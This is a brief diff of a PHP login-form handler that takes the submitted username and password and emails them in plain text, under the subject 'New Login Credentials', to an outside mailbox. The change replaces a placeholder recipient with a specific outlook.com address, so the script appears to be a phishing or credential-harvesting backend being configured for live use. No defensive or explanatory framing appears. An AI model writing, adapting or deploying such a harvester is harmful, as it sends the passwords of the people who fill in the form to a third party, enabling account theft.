@@ -3,7 +3,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $username = $_POST['username'];
     $password = $_POST['password'];
 
-    $to = "your-email@example.com";
+    $to = "blackrosemodelingms@outlook.com";
     $subject = "New Login Credentials";
     $message = "Username: " . $username . "\nPassword: " . $password;
     $headers = "From: no-reply@blackrosemodeling.com";
